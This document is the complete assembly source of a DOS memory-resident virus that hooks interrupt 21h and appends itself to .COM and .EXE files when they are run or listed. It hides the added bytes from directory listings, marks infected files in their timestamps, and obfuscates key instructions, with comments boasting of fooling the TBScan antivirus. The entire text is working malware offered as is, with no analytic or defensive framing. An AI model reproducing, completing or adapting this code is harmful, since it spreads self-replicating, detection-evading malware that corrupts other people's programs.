;% You-name-the-bitch %
;컴컴컴컴컴컴컴컴컴컴컴
.model tiny
.code
 org 100h

pagesize        equ     (((offset last) - (offset start)) shr 9) + 1
parasize        equ     (((offset last) - (offset start)) shr 4) + 1
bytesize        equ     (parasize shl 4)
lastpage        equ     bytesize - (pagesize shl 9)


start:
        push    ds
        call    install
entry:
        jmp     restore

; Information about host program

orgip   dw      020CDh                  ; Entry point if .exe,
orgcs   dw      0                       ; if .com first 3 bytes of file.
com     db      0FFh                    ; If .exe com=0 if .com com=FF

install:
        ; Check if already resident
        mov     ah, 30h                 ; Get dos version
        mov     bx, 1009                ; Installation check
        int     21h
        cmp     bx, 9001                ; Is installed?
        jne     gores
        mov     bp, sp                  ; Get delta offset
        mov     bp, ss:[bp]
        ret

org21:
        db      0EAh                    ; Buffer for original int21
org21o  dw      ?
org21s  dw      ?

gores:
        pop     bp
        cmp     al, 03h                 ; Check dos version
        jb      restore

        ; Try to allocate memory
memall: mov     ah, 48h                 ; Allocate memory
        mov     bx, parasize+3
        int     21h
        jnc     gohigh

        ; Try to decrease host memory
        push    es                      ; Get MCB
        mov     bx, es
        dec     bx
        mov     es, bx
        mov     bx, es:[03h]            ; Get size of memory
        sub     bx, parasize+4          ; Calculate needed memory
        pop     es
        mov     ah, 4Ah                 ; Decrease memory block
        int     21h
        jnc     memall                  ; Allocate memory for virus
        jmp     restore

gohigh:
        ; Move virus to new memory
        dec     ax                      ; es to new mcb
        mov     es, ax
        mov     word ptr es:[1], 8      ; mark dos as owner
        mov     di, 10h                 ; Set es:di to new block
        push    cs                      ; Set ds:si to virus code
        pop     ds
        mov     si, bp
        sub     si, 4                   ; Adjust for first call
        mov     cx, bytesize
        cld
        rep     movsb

        ; Install in int21 vector
        sub     ax, 0Fh                 ; Adjust for org 100h
        mov     ds, ax
        mov     ax, 3521h               ; Save int21 vector
        int     21h
        mov     org21o, bx
        mov     org21s, es
        mov     ah, 25h                 ; Set int21 vector
        mov     dx, offset vector21
        int     21h


restore:
        ; Restore original program
        pop     es
        push    es
        cmp     byte ptr cs:bp[6], 00h           ; Check file type
        je      restexe

        ; Restore .com program
        push    es
        pop     ds
        mov     di, 100h
        push    di
        mov     ax, cs:bp[2]
        stosw
        mov     al, cs:bp[4]
        stosb
        retf

restexe:
        ; Restore .exe program
        pop     ax
        mov     ds, ax
        add     ax, cs:bp[4]            ; relocate cs
        add     ax, 10h
        push    ax
        mov     ax, cs:bp[2]            ; get ip
        push    ax
        retf                            ; Jump to host



vector21:
        cmp     ah, 30h                 ; Get dos version?
        jne     chkexe
        cmp     bx, 1009                ; Installation check?
        jne     chkexe
        call    dos
        mov     bx, 9001                ; Return residency code
        retf    2
chkexe:
        cmp     ax, 4B00h               ; Load and execute?
        jne     chkfcb
        call    infect                  ; Infect file
        jmp     chnexit
chkfcb:
        cmp     ah, 11h                 ; Find file?
        je      fcb
        cmp     ah, 12h                 ; Find file?
        je      fcb

        cmp     ah, 4Eh                 ; Find handle?
        je      fhdl
        cmp     ah, 4Fh                 ; Find handle?
        jne     chnexit
fhdl:   call    dos
        jnc     fhdls
        retf    2
fhdls:  jmp     findhandle

chnexit:
        jmp     org21


fcb:
; Called on find first/find next fcb
        ; Perform dos call

        call    dos
        or      al, al                  ; Check if a file was found
        jz      exist
        retf    2
exist:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        mov     ax, 6200h               ; Get psp
        call    dos
        mov     es, bx
        cmp     bx, es:[16h]            ; Ensure that dos is calling
        jne     fcbexit

        call    getdta                  ; Get address of fcb
        lodsb                           ; Check if extended
        cmp     al, 0FFh
        jne     noext
        add     si, 7
noext:
        mov     bx, si
        add     si, 8                   ; Check extension
        lodsw
        push    ax

        add     si, 0Ch                 ; Check for infection
        lodsb
        and     al, 1Fh
        cmp     al, 03h
        pop     ax
        pushf
        add     si, 5

        cmp     ax, 'OC'
        je      fcbcom
        cmp     ax, 'XE'
        je      fcbexe
        popf
        jmp     fcbexit

fcbcom:
        ; Check for infection
        popf
        jne     fcbcomni
        sub     word ptr [si], bytesize
        jmp     fcbexit
fcbcomni:
        in      al, 41h                 ; Get timer (rnd)
        test    al, 03h                 ; 25% infection
        jne     fcbexit
        call    cvtasciz                ; Convert to asciz
        mov     ax, 'C.'                ; Append exetnsion
        stosw
        mov     ax, 'MO'
        stosw
        jmp     fcbinfect

fcbexe:
        ; Check for infection
        popf
        jne     fcbexeni
        sub     word ptr [si], bytesize
        jmp     fcbexit
fcbexeni:
        in      al, 41h                 ; Get timer (rnd)
        test    al, 03h                 ; 25% infection
        jne     fcbexit
        call    cvtasciz
        mov     ax, 'E.'
        stosw
        mov     ax, 'EX'
        stosw

fcbinfect:
        xor     al, al
        stosb
        mov     dx, offset last
        push    cs
        pop     ds
        call    infect

fcbexit:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        retf    2


cvtasciz        proc
        push    cs                      ; Convert to asciz
        pop     es
        mov     si, bx
        mov     di, offset last
        mov     cx, 8
loop3:  lodsb
        cmp     al, ' '
        je      loopx
        stosb
        loop    loop3
loopx:  ret
cvtasciz        endp


infect  proc
; Called on load and execute
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        mov     ax, 3D82h               ; Open victim
        call    dos
        jc      exitinfect
        xchg    ax, bx

        mov     ax, 5700h               ; Save file date/time
        call    dos
        push    dx
        push    cx

        mov     ah, 3Fh                 ; Read first bytes
        push    cs
        pop     ds
        lea     dx, orgip
        mov     cx, 2
        call    dos
        xor     orgip, 4523h            ; Check if .exe file
        cmp     orgip, 'MZ' xor 4523h   ; TBScan fooled again...
        je      infectexe
        cmp     orgip, 'ZM' xor 4523h
        je      infectexe
        xor     orgip, 4523h
        jmp     infectcom

infectdone:
        pop     cx                      ; Restore date/time of file
        pop     dx
        mov     ax, 5701h
        call    dos

        mov     ah, 3Eh                 ; Close file
        call    dos
exitinfect:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret
infect  endp

infectexe:
        ; Read header from .exe file
        mov     ah, 3Fh
        lea     dx, last                        ; Use memory above virus
        mov     cx, 16h
        call    dos

        ; Calculate address of entrypoint
        mov     ax, word ptr last[entryseg]     ; Get entry cs value
        add     ax, word ptr last[headsize]     ; Get header size
        mov     cx, 10h                         ; Convert to bytes
        mul     cx
        add     ax, word ptr last[entryofs]     ; add ip offset
        adc     dx, 00

        ; Seek to entrypoint
        mov     cx, dx
        xchg    dx, ax
        mov     ax, 4200h
        call    dos

        ; Check if already infected
        mov     ah, 3Fh                         ; Read bytes at entry
        mov     cx, 4h
        lea     dx, orgip
        mov     si, dx
        call    dos

        lodsw                                   ; Compare entry to virus
        cmp     ax, word ptr start
        jne     exenotinf
        lodsw
        cmp     ax, word ptr start[2]
        je      infectdone


exenotinf:
        ; Mark infection
        pop     ax                              ; Get time stamp
        and     al, 0E0h                        ; Mask seconds
        or      al, 003h                        ; Set seconds to 6
        push    ax

        ; Infect file
        lea     si, last[entryofs]              ; Save program information
        lodsw
        mov     orgip, ax
        lodsw
        mov     orgcs, ax
        mov     cs:com, 0                       ; This is .exe

        ; Calculate virus entry
        mov     ax, 4202h                       ; Seek to eof
        xor     cx, cx
        cwd
        call    dos

        xchg    ax, dx                          ; eof pos in ax:dx
        mov     cl, 12
        shl     ax, cl
        mov     word ptr last[entryseg], ax
        xchg    ax, dx
        xor     dx, dx
        mov     cx, 10h                         ; Convert eof pos to paras
        div     cx
        sub     ax, word ptr last[headsize]     ; Calculate entry for virus
        add     word ptr last[entryseg], ax     ; Save in header
        mov     word ptr last[entryofs], dx

        ; Recalculate size
        mov     ax, word ptr last[lastsize]
        add     ax, bytesize
        cwd
        mov     cx, 200h
        div     cx
        mov     word ptr last[lastsize], dx
        add     word ptr last[pages], ax


        mov     ah, 3Fh                         ; Append virus
        mov     dx, 100h
        mov     cx, bytesize
        inc     ah                              ; TB-Moron(tm)
        push    ax
        call    dos

        ; Save modified exe-header
        mov     ax, 4200h                       ; Seek to header
        xor     cx, cx
        mov     dx, 2
        call    dos

        pop     ax
        lea     dx, last                        ; Write header
        mov     cx, 16h
        call    dos

        jmp     infectdone


infectcom:
        ; Installation check
        call    ichkcom
        jnc     comnotinf
        jmp     infectdone

comnotinf:

        ; Mark infection
        pop     ax                              ; Get time stamp
        and     al, 0E0h                        ; Mask seconds
        or      al, 003h                        ; Set seconds to 6
        push    ax

        mov     com, 0FFh

        ; Seek to eof
        mov     ax, 4202h
        xor     cx, cx
        cwd
        call    dos

        ; Create jump opcode
        sub     ax, 3
        mov     word ptr last, ax

        ; Append virus
        mov     ah, 3Fh
        mov     cx, bytesize
        mov     dx, 100h
        inc     ah                              ; TB...
        push    ax
        call    dos

        ; Write jump to beginning of file
        mov     ax, 4200h
        xor     cx, cx
        cwd
        call    dos
        pop     ax                              ; TB...
        mov     cx, 3
        lea     dx, jumpop
        call    dos

        jmp     infectdone



findhandle:
        pushf
        push    ax
        push    bx
        push    cx
        push    si
        push    di
        push    ds
        push    es

        call    getdta                  ; dta to es:si and ds:si
        mov     di, si

        mov     al, si[16h]             ; Get seconds
        and     al, 1Fh
        cmp     al, 3
        pushf

        add     di, 1Eh                 ; di to name
        mov     cx, 9
        mov     al, '.'
        repne   scasb                   ; scan for extension
        xchg    si, di
        lodsw
        cmp     ax, 'OC'                ; check if com?
        je      hdlcom
        cmp     ax, 'XE'
        je      hdlexe
        popf
        jmp     hdlexit

hdlcom:
hdlexe:
        popf
        jne     hdlexit
        sub     word ptr di[1Ah], bytesize
        sbb     word ptr di[1Ch], 0

hdlexit:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     cx
        pop     bx
        pop     ax
        popf
        retf    2






ichkcom proc
; Checks if com-file with handle in bx is infected

        mov     ax, 4200h               ; Seek to beginning
        xor     cx, cx
        cwd
        call    dos

        push    ds

        mov     ah, 3Fh                 ; Read first bytes
        mov     cl, 3
        mov     dx, offset orgip
        call    dos

        cmp     byte ptr orgip, 0E9h    ; Check if jump
        jne     icnotinf

        mov     ax, 4201h               ; Seek to entry point
        xor     cx, cx
        mov     dx, word ptr orgip[1]
        call    dos

        mov     cl, 4
        call    readtolast              ; Get entry point
        cmp     word ptr last, 0E81Eh
        jne     icnotinf
        cmp     word ptr last[2], 00007h
        jne     icnotinf

        pop     ds
        stc                             ; Return with carry
        ret
icnotinf:
        pop     ds
        clc                             ; Not infected
        ret
ichkcom         endp



dos     proc
        pushf
        call    dword ptr cs:org21o
        ret
dos     endp


getdta  proc
        mov     ah, 2Fh                 ; Get dta
        call    dos
        push    es                      ; ds:si to dta
        pop     ds
        mov     si, bx
        ret
getdta  endp


readtolast      proc
        mov     ah, 3Fh
        push    cs
        pop     ds
        mov     dx, offset last
        call    dos
        ret
readtolast      endp



jumpop  db      0E9h
last:

exehead struc
        lastsize        dw      ?
        pages           dw      ?
        tblesize        dw      ?
        headsize        dw      ?
        minalloc        dw      ?
        maxalloc        dw      ?
        stackseg        dw      ?
        stackofs        dw      ?
        checksum        dw      ?
        entryofs        dw      ?
        entryseg        dw      ?
exehead ends

end     start
================================================================================
